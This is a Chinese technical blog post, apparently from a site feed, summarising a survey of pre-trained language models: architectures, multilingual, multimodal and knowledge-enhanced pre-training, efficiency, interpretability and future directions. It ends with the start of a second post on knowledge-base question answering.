<p>最近，GLM (Du et al., 2021) 提出了一种更优雅的方法来结合自回归和自编码。给定一个可变长度的掩码跨度，而不是像 BERT 一样，一个 token 对应一个 [MASK] 标记。GLM 会自回归地生成 [MASK] 对应的 token。GLM 是第一个在包括自然语言理解、条件生成和无条件生成在内的所有类型任务上同时实现最佳性能的模型。</p>
<h4 id="应用广义的编码-解码器">应用广义的编码 - 解码器</h4>
<p>在 GLM 之前，无论是编码器架构的模型（例如 BERT）还是解码器架构的模型（例如 GPT），都无法解决在句子的多个空白处添加任意个符号的问题。BERT 只能将 MASK 替换为一个单词，而 GPT 只能在句子末尾添加任意个单词。因此，很自然的想法是转向类似机器翻译 Transformer 的 encoder-decoder 架构。</p>
<p>这一类型的先驱是 MASS（Song et al., 2019），它将掩码预测策略引入到编码器 - 解码器结构中。然而，MASS 并没有涉及填充可变长度空白的问题。 T5 (Raffel et al., 2020) 通过仅用一个掩码标记掩码文本中可变长度的跨度来解决该问题，并要求解码器恢复整个掩码序列。BART (Lewis et al., 2020a) 引入了一个有趣的想法，即通过截断、删除、替换、改组和掩码等多种操作来破坏源序列，而不仅仅是掩码。然而，encoder-decoder 架构的预训练模型存在以下问题：</p>
<ol type="1">
<li>参数更多、参数效率低下</li>
<li>在 NLU 方面表现不佳</li>
</ol>
<h3 id="认知启发式架构">认知启发式架构</h3>
<p>虽然 Transformer 很强大，但与人类的认知系统还是有较大差距。注意力机制借鉴自人类的感知功能，然而人类还具有决策、逻辑推断、工作记忆等功能。</p>
<h4 id="可维护的工作记忆">可维护的工作记忆</h4>
<p>Transformer 的一个问题在于固定的序列长度和<span class="math inline"> \(O(n^2)\)</span> 的复杂度，即每个 token 都要与其他 token 计算注意力。这严重阻碍了它在长文档理解中的生成和应用。然而，人类也不具备很好的长程注意力机制。认知科学家们发现人类可以保持一种工作记忆，这种记忆不仅可以组织和记忆，还可以忘却。传统的 LSTM 正是这种思想的实践。</p>
<p>基于 Transformer 的架构中，Transformer-XL 是第一个引入段级递归和相对位置编码来实现这一目标的。它将源序列分割为若干个段，上一个段的状态会被缓存下来，在当前片段计算注意力时使用（但不更新梯度），然后缓存新的状态，重复此过程，也就是段级递归名称的来源。这个过程隐含着工作记忆的思想。CogQA 提出在多跳阅读中保持认知图。它通过 PTM（BERT）和 GNN 两个系统建模认知图。先通过 BERT 提取相关实体，再通过 GNN 构造认知图谱，进行推理和计算。CogQA 的一个局限是 PTM 仍使用了固定的窗口大小。CogLTX 将长文本切分为若干个 block，利用记忆回想模块给 block 打分，选择相关性更高的 block 进行使用。</p>
<h4 id="可持续的长期记忆">可持续的长期记忆</h4>
<p>GPT-3 的成功揭示了 Transformer 具有记忆功能。在此之前， Lample et al. (2019) 等人发现，将 Transformer 的前馈神经网络替换为大型键值记忆网络，仍可以工作的很好。这在某种程度上表明 Transformer 中的前馈神经网络等价于记忆网络。然而，其记忆内存容量非常有限。REALM (Guu et al.,2020) 探索了如何为 Transformer 构建外部存储的先驱。它通过将整个维基百科的文本向量化，使用掩码语言模型预训练知识检索器。在开放域问答上取得了 SOTA 效果。</p>
<p>除了张量文本语料库外，(Vergaet al., 2020; Févry et al., 2020) 提出将知识库中的实体和关系向量化，并将上下文中 token embedding 替换为对应的 entity embedding。(Dhingra et al., 2020; Sun et al., 2021) 从零开始维护一个虚拟知识，并提出了一个可微分的训练目标。所有这些方法在很多开放域问答基准上取得了一些改进。</p>
<h4 id="其他变种">其他变种</h4>
<p>此外，还有一些工作致力于修改 BERT 的结构 / 预训练目标，达到更好的 NLU 能力。Span-BERT 证实了使用跨边界目标 (SBO) 掩盖连续随机长度的 token 可以提高 BERT 的性能。ELECTRA 将掩码语言模型替换为替换符号检测任务，生成器会替换原始序列中的 token，而判别器检测 token 是否被替换。</p>
<h2 id="使用多源数据">使用多源数据</h2>
<p>一些预训练模型使用多源异构数据，例如多模态、多语言的 PTM、知识增强的 PTM。</p>
<h3 id="多语言预训练">多语言预训练</h3>
<p>在单语言语料库（如英语）上预训练的模型在许多基准测试中取得了巨大成功。但是我们生活的世界是多语言的，为每种语言都训练和维护一个单独的模型并不是一个合理的方案，尤其是涉及到机器翻译的场景。事实上，虽然人们使用的语言不尽相同，但是他们可以表达相同的意思。这表明语义是独立于语言的。一些研究人员发现，使用多语言训练模型，效果要优于几种单语言模型。因此，相较于训练很多个单语言模型，训练多语言模型可能是个更好的方法。</p>
<p>在 BERT 之前，已经有研究者探索多语言表征，主要有两种方法。第一种是参数共享，例如使用多种语言对训练多语言 LSTM，实现多语言翻译。另一种是学习与语言无关的约束，例如使用 WGAN 框架将语言表示解耦为与语言无关的表示。这两种方式都能应用于多语言场景，但仅限特定的任务。换而言之，上述两种方法都是用同一个特定的任务训练的，不能推广到其他任务。</p>
<p>BERT 的出现表明，使用自监督的方法进行预训练，对特定任务进行微调的方法是可行的。这促使研究人员设计任务预训练通用的多语言模型。多语言任务同样可以分为 NLU 和 NLG 两类。</p>
<p>一些 NLU 任务首先在非并行多语言语料上训练多语言的 PTM。例如，Devlin 等人提出的多语言的 BERT（mBERT），使用维基百科上 104 种语言的非并行语料库建模多语言掩码语言模型（MMLM）任务。（吐槽，维基百科不同语言的内容还是有较大差别的）。研究表明，mBERT 具有在零样本场景中泛化跨语言知识的能力。这表明即使使用相同的 BERT 结构，使用多语言数据也可以使模型学习跨语言表示。XLM-R 构建了一个名为 CC-100 的非并行多语言数据集，规模远大于 mBERT 使用的维基百科语料，尤其是对于那些语料相对匮乏的语言。XLM-R 在 CC-100 上进行预训练，在多项基准测试中获得优于 mBERT 的性能，这表明更大规模的多语言语料库可以带来更好的性能。</p>
<p>然而，多语言掩码语言模型无法很好的利用并行语料。而并行语料对于一些 NLP 任务，例如机器翻译来说是至关重要的。并且直觉来说，并行语料能够让模型更快更好地学习到意义相同的跨语言表征。从这一点出发，XLM 使用双语句子执行翻译语言模型（TLM）的任务。具体做法是将双语语料拼接成一个句子，在两个部分中分别随机掩码。与 MLM 相比，TLM 需要模型从不同语料中获取和对齐语义信息，并进行预测。</p>
<p>除了 TLM，还有一些其他的方法从并行语料中学习跨语言表征。Unicoder 提供了两个基于平行语料的新预训练任务：跨语言单词恢复（CLWR）和跨语言释义分类（CLPC）。CLWR 使用目标语言 embedding 和注意力机制恢复源语言 embedding，类似机器翻译。CLPC 将对齐的语料拼接作为正样本，未对齐的作为负样本，进行句子级别的分类。ALM (Yang et al., 2020) 自动从并行句子生成代码转换序列并对其执行 MLM，这迫使模型仅基于其他语言的上下文进行预测。InfoXLM (Chi et al., 2020b) 从信息论的角度分析了 MMLM 和 TLM，鼓励模型在对比学习的框架下区分对齐的句子对和未对齐的负例。HICTL (Wei et al., 2021) 扩展了使用对比学习来学习句子级和单词级跨语言表示的想法。 ERNIE-M (Ouyang et al., 2020) 提出了反向翻译掩码语言建模（BTMLM），并通过反向翻译机制扩大了并行语料库的规模。反向翻译是一种数据增强的方法，例如将语言 X 翻译为语言 Y 的任务，可以将语言 Y 翻译回语言 X‘，然后比较 X 与 X’是否相同，若不同的话可以将 X' 也加入数据集。 这些工作表明，利用平行语料库可以为学习跨语言表示带来很大帮助。</p>
<h3 id="多模态预训练">多模态预训练</h3>
<p>人类所面临的世界是多模态的，包含视觉、听觉、语言等多种模态。模态指的是事情是如何发生和经历的。近年来，研究者们对多模态研究热情高涨，这些跨模态的工作大部分都归类于视觉和语言（V&amp;L）的交叉，例如视频和文本、图像和文本的交叉。V&amp;L 预训练的工作主要集中在改进模型架构、利用更多数据以及设计更好的预训练任务上。</p>
<p>对于基于图像文本的 PTM，目前大多数工作都是基于视觉语言 BERT 的架构。主要挑战在于统一语义空间中视觉和文本内容的对齐（即 V&amp;L 基础）。为此，主要有两种模型架构设计：双流和单流。双流模型，例如 ViLBERT，使用两个独立的流处理图像和文本，并将它们通过 Transformer 注意力模块融合。单流模型，例如 Visu-alBERT，图像区域特征和词嵌入通常被拼接送入单个 Transformer 中。考虑到简单性和效率，目前工作主要使用单流模型。</p>
<p>在预训练任务的选择上，V&amp;L 的理解任务广泛使用 MLM、句子 - 图像对齐（SIA）、遮挡区域分类（MRC），遮挡区域特征回归（MRFR）和直接合并下游任务。其中，MLM 旨在借助视觉和文本上下文恢复字幕中的掩码标记。 SIA 旨在判断图像 - 文本对是否匹配。 MRC 可以被认为是视觉 MLM，需要 V&amp;L 模型来预测被掩蔽对象的类别。MRFR 进一步需要 V&amp;L 模型来恢复被掩蔽对象区域的视觉特征。 也有模型在预训练阶段直接进行下游 V&amp;L 理解任务。</p>
<p>上述提到的预训练任务专用于 V&amp;L 理解或者字幕生成，不能用于图像生成任务。最近提出的 DALLE 是第一个基于 Transformer 的文本到图像的 PTM，可用于条件图像生成，它显示了多模态 PTM 在联系文本描述和图像生成之间的潜力，尤其是组合不同对象的出色能力。</p>
<p>除了图像 - 文本 PTM，还有其他形式的 PTM，例如视频和音频。 VideoBERT (Sun et al., 2019a) 对 Cooking312K 视频数据集 (Sun et al.,2019a) 进行预训练，并在零镜头动作分类任务和视频字幕任务上验证模型。SpeechBERT (Chuang et al., 2019）首先将连续音频信号编码成几个语音语义词嵌入，然后使用 MLMon 文本和音频模态作为预训练任务。 预训练后，使用口语问答（SQA）任务进行评估。</p>
<h3 id="知识增强预训练">知识增强预训练</h3>
<p>PTM 可以从大量数据中获取统计信息，而外部知识是统计建模的优秀先验。外部知识可以分为结构化知识（如知识图谱）和非结构化知识（维基百科文本）。一些工作试图通过整合实体和关系嵌入来增强 PTM，或者是它们与文本的对齐方式。Wang 等人（2021b）基于维基数据实体的描述预训练模型，通过将语言模型损失和知识嵌入损失结合在一起以获得知识增强表示。</p>
<h2 id="提高计算效率">提高计算效率</h2>
<p>PTM 的趋势是模型越来越大，因此提升计算效率以满足日益增加的内存与计算需求非常关键，可以分为以下三种方法。</p>
<h3 id="系统级优化">系统级优化</h3>
<p>通常与具体模型无关，可以分为单设备优化和多设备优化。</p>
<p><strong>单设备优化</strong>，一个典型的例子是浮点数精度优化。现代深度学习系统主要基于单精度浮点数（FP32），然而权重往往落在一个有限的区间里， 可以考虑使用半精度格式（FP16）完成大部分计算，而几乎没有精度损失。但是在某些情况下，也可能会出现浮点截断和溢出，为解决这个问题，研究者们提出了混合精度训练，它在 FP32 中保留一些临界权重以避免浮点溢出，并使用动态损失缩放操作来摆脱浮点截断。充分的实验表明，混合精度训练方法比 FP16 中直接训练模型更稳定。尽管混合精度训练方法可以显着减少训练时间和内存使用量，但它们仍然面临一些挑战。当模型参数没有很好地初始化时，混合精度方法仍然可能导致训练不稳定。这些挑战仍有待进一步探索。此外，还可以通过舍弃 Transformer 中的部分隐藏状态、利用 CPU 存储模型参数再通过精细的策略完成 CPU 和 GPU 内存交换，来降低模型内存开销。</p>
<p><strong>多设备优化</strong>。预训练模型往往使用分布式的方法进行训练，使用多个节点中的多个 GPU 来加速计算，并行方法可以分为数据并行、模型并行。</p>
<p><strong>数据并行</strong>是一种简单有效的加速模型的方法，如下图所示。使用数据并行时，大 Batch 数据被划分到不同的节点，可以并行化前向传播。 在反向传播时，不同节点上的梯度应该通过 all-reduce 操作进行聚合，以保证参数优化的一致性，这可能会引入额外的通信开销。容易看出，这相当于每个 GPU 上都保存了一份模型参数。</p>
<p>当单个模型的参数达到十亿或更多时，模型参数无法容纳在同一个 GPU 上（即使是半精度或者混合精度训练），这使得数据并行无法进行。<strong>模型并行</strong>则可以解决这个问题，通过将矩阵运算分块，分布在不同的 GPU 上，再通过节点间的通信操作保证前向 / 反向传播的正确性。但是，模型并行需要在前向 / 反向传播过程中插入通信操作，无法与计算重叠。对比之下数据并行的 all-reduce 操作通常可以被反向计算重叠。因此，数据并行是首选，只要它可以克服内存容量的过度需求。</p>
<p>下面这张图和模型并行和数据并行的示例。</p>
<p><img src="data-parallel.png"></p>
<p>模型并行还存在另一种流水线并行的方法。将模型划分为很多层，不同层分布在不同的节点，前一层的输出作为后一层的输入。流水线并行只需要在执行管道相邻阶段的节点之间传递中间激活状态，通信成本较小。但是，流水线并行以一个 batch 的前向和反向传播为完整周期，会有流水线气泡产生。</p>
<h3 id="高效预训练">高效预训练</h3>
<p>除了一些系统级的优化方法外，研究人员还致力于探索更有效的预训练方法，以便能够以较低成本的解决方案对大规模 PTM 进行预训练。</p>
<p><strong>高效的训练方法。</strong>传统的预训练任务可能样本效率低下。以 MLM 为例，需要模型根据上下文来预测掩码标记。掩码标记通常是输入标记的子集（通常为 15%），即模型只能从一小组输入标记中学习。为了解决这个问题，ELECTRA (Clarket al., 2020) 提出了替换令牌检测任务。此任务强制模型区分输入标记是否被生成器替换。此任务可以利用来自每个样本的更多监督信息，因为需要区分所有输入标记。实验证明，ELECTRA 仅需少得多的预训练步骤，就可以达到与 MLM 相似的性能。另外，传统 MLM 随机掩盖文档中的标记以进行预测。由于预测不同标记的难度差异很大，随机掩码策略使训练过程变得漫无目的且效率低下。一些工作根据 token 的重要性或者梯度，加速模型训练。</p>
<p>除了预训练任务外，当前的预训练动态也是次优的。最近的大规模 PTM 都要求大的 batch size，因为研究指出这有利于模型收敛。但在一项早期工作中（Goyal 等人，2017 年），研究人员发现简单地增加 batch size 可能会导致<strong>优化困难</strong>。因此，他们提出了一种预热策略（即 warm up），在训练开始时线性增加学习率。这种策略通常用于最近的大规模 PTM。此外，研究者发现在 Transformer 不同层间自适应地使用不同的学习率也可以在 batch size 较大时加快收敛速度。</p>
<p><strong>高效的模型架构。</strong>除了高效的预训练方法，更多的模型架构变体也可以降低计算复杂度，提高训练效率。正如之前提到的，基于 Transformer 的 PTM 面临长输入序列时会存在<span class="math inline"> \(O(n^2)\)</span> 序列长度复杂度的问题。一些工作致力于降低 Transformer 的复杂度。</p>
<h3 id="模型压缩">模型压缩</h3>
<p>另一个提高 PTM 效率的重要方法是模型压缩。通过将大型模型压缩为小型模型，以满足资源受限设备上更快推理和部署的需求。</p>
<p><strong>参数共享。</strong>PTM 可以通过在相似单元之间共享参数进行压缩。AL-BERT (Lan et al., 2019) 使用分解嵌入参数和跨层参数共享来减少 PTM 的参数，在所有 Transformer 层上使用相同的权重。ALBERT 在 BERT 模型的基础上实现了显着的参数减少，同时具有相同甚至更好的性能。这表明 PTM 可能极度过度参数化。</p>
<p><strong>模型剪枝。</strong>为了更好地利用当前 PTM 的过度参数化特性，另一种减少模型参数的方法是模型剪枝，它在 PTM 中剪掉一些无用的部分，以在保持性能的同时实现加速。研究人员研究了 Transformers 中注意力头的冗余，发现只有一小部分就足以获得良好的性能。这些头中的大部分都可以移除，而对准确性的影响很小。</p>
<p><strong>知识蒸馏。</strong>虽然 ALBERT 减少了 PTM 的大小，但并没有减少推理时间，因为模型计算复杂度并没有减小。知识蒸馏旨在训练一个小模型以复现大模型的行为。有一些典型的工作将知识蒸馏用于 PTM，例如 DistillBERT (Sanhet al., 2019)、TinyBERT (Jiao et al., 2019)、BERT-PKD (Sun et al., 2019b) 和 MiniLM (Wang et al., .,2020d)。 但是，知识蒸馏方法需要用于预训练教师模型的数据，考虑到数据版权和隐私，这些数据通常不会发布。而且，教师模型需要对整个预训练数据进行转发，以产生对数或中间表示进行知识蒸馏，导致训练时间更长。</p>
<p><strong>模型量化。</strong>模型量化是指将高精度浮点参数压缩为低精度浮点参数。 模型量化这个词听上去不是很好理解，更像是一种参数压缩方法。 传统的 PTM 通常用 32 位或 16 位浮点数表示参数，而量化后的模型可以用 8 位甚至 1 或 2 位表示。一种量化方法可以使用 k-means 对参数进行聚类，让相近的值落在同一个聚类中心，进而复用同一个值。对于最近的基于 Transformer 的模型，8 位量化已在 Q8BERT 中被证明是有效的，对模型性能的影响很小。为了减轻性能下降，也可以采用其他保持精度的方法。 Q-BERT (Shen et al.,2020a) 使用混合比特量化，其中 Hessian 谱较高的参数需要更高的精度，而 Hessian 谱较低的参数需要较低的精度。</p>
<h2 id="可解释性理论">可解释性 &amp; 理论</h2>
<p>鉴于 PTM 在多项任务上取得的卓越性能，研究者试图解释 PTM 的行为，包括其如何工作和捕获到了怎样的模式。这些工作涵盖了 PTM 的几个重要属性：知识、鲁棒性和结构稀疏性 / 模块化。 此外，在构建 PTM 的理论分析方面也有一些开创性的工作。</p>
<h3 id="知识">知识</h3>
<p>PTM 捕获的隐性知识大致可以分为两大类：语言知识和世界知识。</p>
<p><strong>语言知识</strong>包含了句子的语法、语义、词义等信息。与传统的神经模型如 CNN 和 RNN 相比，大规模 PTM 可以从海量的预训练数据中学习到丰富的语言知识。为了研究 PTM 的语言知识，研究人员设计了几种方法：表征分类（利用隐藏状态对句子 / 单词进行分类）、表征分析（利用隐藏状态计算统计信息，例如相似度、距离）、注意力分析（利用注意力矩阵，发现文本的层次结构）、生成分析（语言模型计算概率）。</p>
<p><strong>世界知识</strong>主要包括常识知识和事实知识。Davison 等人提出将关系三元组转化为掩码句子，根据 PTM 给出的互信息对句子进行排序，证明在其表示空间中学习了各种常识特征。Petroni 等人（2019）提出将关系知识生成表述为填空语句的完成。根据实验结果，他们发现在没有任何微调的情况下，PTM 在这项任务上明显优于以前的监督基线，证实 PTM 学习到了事实知识。但是，这些填空语句的构造并非易事。</p>
<h3 id="鲁棒性">鲁棒性</h3>
<p>近期工作通过使用对抗性样本证明 PTM 存在严重的鲁棒性问题。对抗性攻击旨在通过对原始输入的小扰动来生成被模型错误分类的新样本。 例如，PTM 很容易被同义词替换所愚弄。事实上，这个问题在 word2vec 时代就存在了。由于同义词、反义词所在上下文相似，它们的表征也近似。同时，不相关的格式词也会误导 PTM 做出错误的预测。但是高质量对抗样本的获取也面临挑战，目前的工作主要利用模型的预测概率和模型梯度来搜索对抗性样本。最近，人在回路（Human-in-the-loop）方法（Wallace 等人，2019b；Nie 等人，2020）已被应用于生成更自然、有效和多样化的对抗样本，这带来了更大的挑战和经验。总而言之，当人们为实际应用部署 PTM 时，PTM 的鲁棒性已成为严重的安全威胁。</p>
<h3 id="结构稀疏性">结构稀疏性</h3>
<p>正如前文提到的，Transformer 具有过度参数化的问题。研究人员表明，多头注意力结构在机器翻译 (Michel et al., 2019)、抽象摘要 (Baan et al., 2019) 和语言理解 (Kovaleva et al., 2019) 的任务中是多余的，即当去除部分注意力头，可以获得更好的性能。这种现象与 (Clark et al., 2019) 中的观察结果一致，他们发现同一层中的大多数头部具有相似的自我注意模式。他们的研究结果表明，不同头部的注意力行为可以归类为一组有限的模式。除了多头注意力之外，其他几项工作也在探索识别参数的稀疏性。 Gordon 等人 (2020) 表明，低水平的剪枝 (30-40%) 根本不会影响预训练损失或下游任务的性能。</p>
<h3 id="ptm理论">PTM 理论</h3>
<p>由于预训练在深度学习方面取得了巨大成功，研究人员试图研究预训练的工作原理，尤其是无监督预训练。在深度学习的早期，人们发现通过贪婪的逐层无监督预训练和监督微调来训练深度贝叶斯网络是有效的（Hin-ton et al., 2006）。最近，基于包括语言建模在内的对比学习的预训练已经成为主流方法。</p>
<p>Erhan et al. (2010) 提出了两个假设来解释预训练的效果：（1）更好的优化和（2）更好的正则化。在更好的优化方面，与随机初始化的模型相比，预训练的网络更接近全局最小值。在更好的正则化方面，PTM 的训练误差不一定比随机模型好，而 PTM 的测试误差更好，这意味着更好的泛化能力。</p>
<p>对于预训练目标的最新发展。Saunshi, et al（2019）对对比无监督表示学习进行了理论分析。对比学习将出现在相同上下文中的文本 / 图像对视为语义相似对，将随机采样的对视为语义不相似对。然后，相似对之间的距离应该很近，不同点之间的距离应该很远。在语言建模的预测过程中，上下文和目标词是相似对，其他词是负样本（Kong et al., 2020）。Saunshi 等人（2019）首先提供了一个新的概念框架来弥合预训练和微调之间的差距。具体来说，他们引入了潜在类的概念，语义相似的对来自同一个潜在类。例如，潜在类可以是 “快乐” 以包括所有文本，包括快乐的情绪。潜在类涵盖所有可能的类，下游任务定义的类来自潜在类集合。然后，他们证明了对比学习的损失是下游损失的上限。因此，在优化预训练损失时，我们可以预期下游任务的损失会更低。</p>
<h2 id="未来发展方向">未来发展方向</h2>
<h3 id="架构和预训练方法">架构和预训练方法</h3>
<p>值得探索的问题有：</p>
<ul>
<li><strong>新架构。</strong>Transformer 饱受诟病的计算复杂度，需要更有效的模型捕获更长范围的依赖信息。另外，也需要根据下游任务设计特定架构，例如 NLU 使用 Transformer Encoder，NLG 使用 Transformer Decoder。</li>
<li><strong>新的预训练任务。</strong>如何设计有效、高效的自监督任务，类似 ELECTRA。</li>
<li>不止微调。微调是将 PTM 的知识转移到下游任务的主要方法，但一个缺点是其参数效率低下：每个下游任务都有自己的微调参数。NLU 最近盛行的 Prompt 就是对微调的改进。</li>
<li><strong>可靠性。</strong>提高 PTM 的鲁棒性，免受对抗攻击。</li>
</ul>
<h3 id="多语言多模态预训练">多语言、多模态预训练</h3>
<ul>
<li>更多的模态。除了图像和文本，还可以利用视频和音频进行多模态预训练。主要挑战在于如何对这两种模态中涉及的时间上下文进行建模。</li>
<li><strong>更深刻的解释。</strong>将视觉和语言联系起来的原因仍然没有定论，只是一些经验性的感觉，没有脑科学或者深度学习理论的支撑。另外，多模态训练是否会对单模态造成损失，如何克服？这些都是悬而未决的问题。</li>
<li><strong>更多的下游任务。</strong>虽然多模态预训练可以应用于图文检索、图文生成、图文生成等下游任务。 然而，为多模态预训练找到一个 “真正的” 真实世界应用场景仍然具有挑战性。</li>
<li><strong>迁移学习。</strong>多语言模型应当灵活适配新的语言。另外，目前的多模态多语言模型无法处理音频数据，不同语言的音频需要转换为文本再翻译。</li>
</ul>
<h3 id="计算复杂度">计算复杂度</h3>
<p>大规模深度学习模型的新需求给现有的深度学习框架带来了严峻的挑战。为了开发更有效的框架，可以探索以下方向：</p>
<ul>
<li><strong>数据转移。</strong>设计精细的、定义良好的数据调度和计算策略，最小化通信成本、最大化计算和内存资源以及优化计算 - 通信重叠。</li>
<li>并行策略。从数据并行、模型并行、流水线并行以及各种混合并行方法可以根据神经网络的结构和硬件配置找到它们的最佳使用方式。在当前实践中，用户必须全面考虑给定深度学习模型的网络结构和设备间通信带宽，以决定最合适的并行策略或在不同策略之间切换（Shazeer 等，2018）。</li>
<li><strong>大规模预训练。</strong>鉴于现有深度学习框架对模型并行和流水线并行的支持不佳，一些新兴的开源项目开发了用于大规模训练的专用框架。由于应用案例优先以及存在的兼容性问题，这些方法无法共同构成完整的解决方案。</li>
<li><strong>包装器和插件</strong>。由框架提供插件或者包装器自动管理通信操作，避免用户手动编程通信的复杂过程。</li>
</ul>
<h3 id="理论基础">理论基础</h3>
<p>目前的 PTM 理论存在以下问题：</p>
<ul>
<li><strong>不确定性。</strong>PTM（以及其他深度神经网络）的一个未得到解决的问题是它们通常对预测过于自信，即这些模型不知道他们不知道什么。你问 GPT-3 “我的脚有几只眼睛”，GPT-3 肯定会给出 “你的脚有两只眼睛” 这样的答案，这看起来违反直觉。在机器学习中处理这种分布外（OOD）数据通常是一项具有挑战性的任务。为了应对上述挑战，一个有希望的方向是采用贝叶斯方法，探索概率工具来捕获数据和模型的不确定性（也分别称为任意不确定性和认知不确定性）。当然，提高贝叶斯深度学习的计算效率是解决上述挑战的关键因素。</li>
<li><strong>泛化和鲁棒性。</strong>PTM 的另一个重要问题是泛化。从理论上理解预训练在提高下游任务泛化方面的作用很重要。有没有有效的方法来探索 PTM 作为额外的数据资源来提高下游任务的鲁棒性？此外，如前所述，PTM 本身的鲁棒性是一个未解决的问题。</li>
</ul>
<h3 id="模型边缘学习">模型边缘学习</h3>
<p>模型边缘是指存储在模型中的知识。给定三元组 &lt;h,r,t&gt;，我们很容易知道头部实体 h 和尾部实体具有关系 r，但是 PTM 中的表征的意义却不明晰。越来越多的研究人员探索了 PTM 从数据中学到了哪些知识，以及为什么它们在下游任务中表现如此出色？这些模型边缘如何存储和管理？是否有可能建立一个通用连续知识库（UCKB）来存储来自各种 PTM 的模型边缘？这些都是有希望的研究方向。</p>
<h3 id="认知和知识学习">认知和知识学习</h3>
<p>让 PTM 更有知识是 PTM 未来的一个重要主题。可以将知识型 PTM 的未来发展分为以下三种方法：</p>
<ul>
<li><strong>知识增强。</strong>对于输入文本和外部知识，关键的问题是弥合文本表示和知识表示（包括符号或向量）之间的差距，并统一使用它们的信息作为输入。这个问题的解决需要统一的模型架构和知识引导的预训练目标。</li>
<li><strong>知识支持。</strong>根据输入的先验知识，设计不同的模块处理不同类型的输入，类似人脑不同区域对应不同的活动功能，加快训练和推理进程。</li>
<li><strong>知识监督。</strong>通过从知识库和大规模语料库中学习，与仅使用纯文本相比，PTM 可以具有更好的语言理解和生成能力。通过改进认知架构、明确推理、知识交互这三个方向，未来的 PTM 有望于能够轻松理解文字之外的含义。</li>
</ul>
<h3 id="应用">应用</h3>
<p>在具体应用中，PTM 还存在一些问题：</p>
<ul>
<li><strong>对话系统。</strong>虽然基于 Transformer 的开放域对话系统显示出优秀的与人对话的能力，但是在对话领域，缺少特定的预训练任务。</li>
<li><strong>特定领域的 PTM。</strong>当大规模的特定领域语料库可以廉价获得时，可以在这些数据上训练特定领域的 PTM。这种领域专业知识通常被认为对于解决许多特定领域的问题很重要。</li>
<li><strong>领域适应和任务适应。</strong>大规模 PTM 的简单微调对于特定领域的应用是不够的（Gururangan 等人，2020；Ke 等人，2020）。最根本的原因是分布变化：特定域中的数据分布可能与一般预训练文本中的<strong>数据分布</strong>有很大不同。如何弥合预训练和特定任务微调之间的差距变得至关重要。</li>
</ul>
<h2 id="总结">总结</h2>
<p>这篇综述回顾了预训练模型的发展历史、分析了其核心问题并指明了一些改进的方向。这篇论文中的一些工作我也没有接触过，像多模态、Transformer-XL 等。因此读起来也有一些一知半解。建议有余力的读者去看原文。毕竟综述类文章本身就是知识的压缩，很难在博客中再进行压缩了。这也是我为什么这篇博客完全按照原论文格式排版。。。</p>
<p>最后，新年快乐！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.jiqizhixin.com/articles/2021-09-07-3">国内数十位 NLP 大佬合作，综述预训练模型的过去、现在与未来 | 机器之心 (jiqizhixin.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/84159401">Transformer-XL 介绍 - 知乎 (zhihu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/132561405#:~:text=模型量化在最初的定义里是为了压缩模型参数，比如韩松在ICLR2016上获得best%20paper的论文，首次提出了参数量化方法。.,其使用k-mean聚类，让相近的数值聚类到同一个聚类中心，复用同一个数值，从而达到用更少的数值表示更多的数，这是量化操作的一种方案。.%20反过来，从量化数变到原始数的过程，称之为反量化，反量化操作完之后，模型就可以按照原来的方式进行正常的计算。.%20我们认为绝大部分的模型量化算法都能压缩参数，因此压缩参数的实用性不存在问题。.">模型量化了解一下？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.jiqizhixin.com/articles/2016-10-18-7">人类智慧与机器学习结合──微软的「Human-in-the-Loop」 | 机器之心 (jiqizhixin.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>综述</category>
      </categories>
      <tags>
        <tag>BART</tag>
        <tag>预训练模型</tag>
        <tag>BERT</tag>
        <tag>自然语言处理</tag>
        <tag>综述</tag>
        <tag>GPT</tag>
      </tags>
  </entry>
  <entry>
    <title>基于知识库的问答综述（KBQA）</title>
    <url>/blog/2021/10/25/KBQA-survey/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来读一篇 2021 年的知识库问答的综述，《A Survey on Complex Knowledge Base Question Answering:Methods, Challenges and Solutions》，论文收录在 IJCAI 2021 中。这篇文章主要介绍了知识库问答的背景与挑战，并总结介绍了两大主流方法：基于语义解析（semantic parsing-based，SP-based）和基于信息检索（information retrivel-based，IR-based）。 <span id="more"></span></p>
<h2 id="知识库问答">知识库问答</h2>
<p>知识库是一个结构化的数据库，它与知识图谱类似，由（主体 Subject，关系 Relation，客体 Object）三元组组成，例如（JK 罗琳，出生地，英国），常见的知识库有 Freebase 等。这个三元组可以用来回答 “JK 罗琳出生在哪里？” 的问题。与简单的、答案与主体直接相连的简单 QA 不同，复杂 QA 查询任务涉及多跳推理甚至一些聚合关系。例如下图知识库，“谁是 The Jeff Probst Show 提名的 TV Producer 的第一任妻子” 问题的答案，包含多个实体和多跳处理逻辑。 <img src="multi-hop.png"></p>
<p>KBQA 的第一步是识别问题中的主体并链接到知识库中的实体，然后根据实体的邻域推导问题答案。这里分为两种方法基于语义解析和基于信息检索的两种方法。语义解析的思想是将自然语言问题表示为可以在知识库中进行查询的符号化的逻辑形式，然后再用逻辑语言进行查询（例如 SQL）。基于信息检索的方法思想是构建一个问题特定的知识图包含了相关的所有信息，然后将所有实体按相关性进行排序。然而，这些方法会面临以下挑战：</p>
<ul>
<li>基于语义解析的方法很难覆盖复杂的查询（多跳推理、约束关系、数值计算等）。类似的，基于信息检索的方法也很难回答复杂的问题，检索的实体范围可能太小，而且解释性差。</li>
<li>复杂的实体和关系会使得搜索空间过大（逻辑形式、候选结果等），搜索开销过大。</li>
<li>两种方法将问题理解看作重要的步骤，当问题的语法和语义复杂时，模型需要有很强的自然语言理解和生成能力。</li>
<li>弱监督问题。问答数据集中往往只存在问题和答案，缺少推理路径，而标注这样的推理路径成本过于高昂。弱监督问题给两种方法都带来了困难。</li>
</ul>
<p>评估指标上，KBQA 往往是从答案集合上选出置信度最高的，常见的评估指标由 F1、准确率、召回率、Hits@1 等。</p>
<h2 id="主流方法">主流方法</h2>
<p>流程图如下图所示。 <img src="methods.png"></p>
<h3 id="基于语义解析的方法">基于语义解析的方法</h3>
<p>旨在将自然语言问题解析为逻辑形式，按照以下步骤：</p>
<ol type="1">
<li>问题编码</li>
<li>逻辑解析</li>
<li>逻辑验证</li>
<li>逻辑执行</li>
</ol>
<p>优点：解释性强</p>
<p>缺点：严重依赖逻辑形式和解析算法的设计，成为性能提升的瓶颈</p>
